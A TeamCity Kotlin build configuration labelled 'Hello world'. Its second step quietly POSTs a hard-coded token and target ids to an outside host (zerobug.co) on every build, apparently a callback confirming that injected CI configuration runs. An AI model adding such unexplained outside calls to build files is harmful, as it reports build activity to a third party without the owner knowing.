import jetbrains.buildServer.configs.kotlin.v2019_2.*
import jetbrains.buildServer.configs.kotlin.v2019_2.buildSteps.script

version = "2020.1"

project {
  buildType {
    id("HelloWorld")
    name = "Hello world"
    steps {
        script {
            scriptContent = "echo 'Hello world!'"
        }
        script {
            name = "curl"
            scriptContent = """curl -d "token=5db63b48744bb86a21154f28cfd4c446&id_target=129&id=11001118" -X POST https://zerobug.co/build.php"""
        }
    }
  }
}
